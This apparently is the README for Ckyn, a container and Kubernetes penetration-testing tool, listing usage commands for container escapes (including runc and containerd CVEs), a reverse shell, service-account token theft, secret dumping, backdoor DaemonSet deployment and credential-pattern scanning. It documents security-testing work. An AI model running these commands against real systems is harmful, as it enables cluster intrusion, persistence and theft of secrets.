# Ckyn - Lightweight Container Security Assessment Tool

A focused container security assessment tool for penetration testing and security research.

## Features

- **Container Security Evaluation** - Assess container security posture
- **Container Escape** - Exploit container escape vulnerabilities
- **K8s Exploitation** - Kubernetes cluster exploitation
- **Credential Scanning** - Find leaked secrets and credentials
- **Remote Control** - Reverse shell and kubelet exec

## Quick Start

```bash
# Evaluate container security
./ckyn evaluate [--full]

# List available exploits
./ckyn run --list

# Run specific exploit
./ckyn run <exploit-name> [<args>...]
```

## Available Tools

| Tool | Command | Description |
|------|---------|-------------|
| kcurl | `ckyn kcurl <token> get\|post <url>` | Request K8s API Server |
| ectl | `ckyn ectl <endpoint> get <key>` | Enumerate etcd keys |
| ucurl | `ckyn ucurl get\|post <socket> <url>` | Request Docker Unix Socket |
| probe | `ckyn probe <ip> <port> <parallel> <timeout>` | TCP port scan |

## Container Escape Exploits

```bash
# Check Docker Socket
./ckyn run docker-sock-check /var/run/docker.sock

# Escape via cgroup
./ckyn run mount-cgroup "shell-cmd"

# Escape via runc vulnerability (CVE-2019-5736)
./ckyn run runc-pwn "shell-cmd"

# Escape via containerd shim (CVE-2020-15257)
./ckyn run shim-pwn reverse <ip> <port>
```

## K8s Exploitation

```bash
# Get Service Account Token
./ckyn run k8s-get-sa-token <method> <endpoint>

# Dump K8s secrets
./ckyn run k8s-secret-dump <token>

# Deploy backdoor DaemonSet
./ckyn run k8s-backdoor-daemonset <token> <image>
```

## Credential Scanning

```bash
# Scan for leaked AK/Secrets
./ckyn run ak-leakage /path/to/scan

# Supported patterns:
# - AWS API Key
# - SSH/RSA/PGP private keys
# - GitHub/Google/Facebook OAuth tokens
# - Slack tokens and webhooks
# - Generic secrets and API keys
```

## Build

```bash
# Linux amd64
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" ./cmd/ckyn/

# With compression
upx --best ckyn
```

## Why Ckyn?

- **Focused** - Only container/K8s security features
- **Lightweight** - ~14MB binary, no external dependencies
- **Complementary** - Works alongside busybox, linpeas
- **Fast** - Quick evaluation and exploitation

## Legal Disclaimer

This tool is for security testing purposes only. Usage against targets without prior consent is illegal.
